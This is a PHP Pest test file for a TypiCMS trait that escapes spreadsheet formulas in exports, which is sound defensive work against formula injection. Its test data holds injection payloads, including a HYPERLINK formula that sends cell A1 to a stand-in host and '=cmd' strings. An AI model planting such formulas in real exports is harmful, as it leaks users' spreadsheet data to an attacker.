<?php

declare(strict_types=1);

use PhpOffice\PhpSpreadsheet\Cell\DataType;
use PhpOffice\PhpSpreadsheet\Cell\DefaultValueBinder;
use TypiCMS\Modules\Core\Exports\EscapesFormulas;

function escape(mixed $value): ?string
{
    $export = new class
    {
        use EscapesFormulas;

        public function run(mixed $value): ?string
        {
            return $this->escapeFormula($value);
        }
    };

    return $export->run($value);
}

it('keeps null as null so strict null comparison renders an empty cell', function (): void {
    expect(escape(null))->toBeNull();
});

it('leaves harmless values untouched', function (): void {
    expect(escape('John Doe'))->toBe('John Doe')
        ->and(escape('john@example.com'))->toBe('john@example.com')
        ->and(escape('1000'))->toBe('1000')
        ->and(escape(42))->toBe('42');
});

it('neutralizes leading formula metacharacters', function (string $payload): void {
    expect(escape($payload))->toBe("'".$payload);
})->with([
    '=1+2',
    '=HYPERLINK("http://evil.test/?x="&A1,"click")',
    '@SUM(1+1)',
    '+1+2',
    '-1+2',
    "\t=cmd",
    "\r=cmd",
]);

it('makes user content unrecognizable as a formula to the spreadsheet binder', function (string $payload): void {
    expect(DefaultValueBinder::dataTypeForValue($payload))->toBe(DataType::TYPE_FORMULA)
        ->and(DefaultValueBinder::dataTypeForValue(escape($payload)))->not->toBe(DataType::TYPE_FORMULA);
})->with([
    '=1+2',
    '=HYPERLINK("http://evil.test/?x="&A1,"click")',
]);
